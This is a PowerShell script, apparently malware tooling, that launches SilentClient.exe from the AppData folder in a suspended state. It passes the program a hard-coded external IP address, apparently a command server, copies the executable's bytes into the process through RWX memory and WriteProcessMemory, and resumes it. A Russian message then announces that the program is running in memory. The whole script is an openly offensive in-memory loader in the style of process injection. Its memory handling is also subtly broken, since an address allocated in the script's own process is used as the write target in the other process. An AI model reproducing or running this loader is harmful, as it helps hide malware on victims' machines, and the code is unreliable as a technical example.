
# === Dark Memory Execution Script ===

$exePath = "$env:APPDATA\SilentClient.exe"
$argument = "185.201.252.130"
$exeBytes = [System.IO.File]::ReadAllBytes($exePath)
$commandLine = "`"$exePath`" $argument"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, out IntPtr lpNumberOfBytesWritten);
}

[StructLayout(LayoutKind.Sequential)]
public struct STARTUPINFO {
    public uint cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public uint dwX;
    public uint dwY;
    public uint dwXSize;
    public uint dwYSize;
    public uint dwXCountChars;
    public uint dwYCountChars;
    public uint dwFillAttribute;
    public uint dwFlags;
    public short wShowWindow;
    public short cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION {
    public IntPtr hProcess;
    public IntPtr hThread;
    public uint dwProcessId;
    public uint dwThreadId;
}
"@ -Namespace Win32 -Name Native -PassThru

$si = New-Object Win32.Native+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$pi = New-Object Win32.Native+PROCESS_INFORMATION

$success = [Win32.Native+Kernel32]::CreateProcess(
    $null,
    $commandLine,
    [IntPtr]::Zero,
    [IntPtr]::Zero,
    $false,
    0x00000004,  # CREATE_SUSPENDED
    [IntPtr]::Zero,
    $null,
    [ref]$si,
    [ref]$pi
)

if (-not $success) {
    throw "CreateProcess failed: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}

$baseAddress = [Win32.Native+Kernel32]::VirtualAlloc([IntPtr]::Zero, $exeBytes.Length, 0x1000, 0x40)
if ($baseAddress -eq [IntPtr]::Zero) {
    throw "VirtualAlloc failed"
}

[IntPtr]$written = [IntPtr]::Zero
[Win32.Native+Kernel32]::WriteProcessMemory($pi.hProcess, $baseAddress, $exeBytes, $exeBytes.Length, [ref]$written)

[System.Diagnostics.Process]::GetProcessById($pi.dwProcessId).Threads[0].Resume()

Write-Host "🔥 SilentClient.exe запущен в памяти с аргументом: $argument"
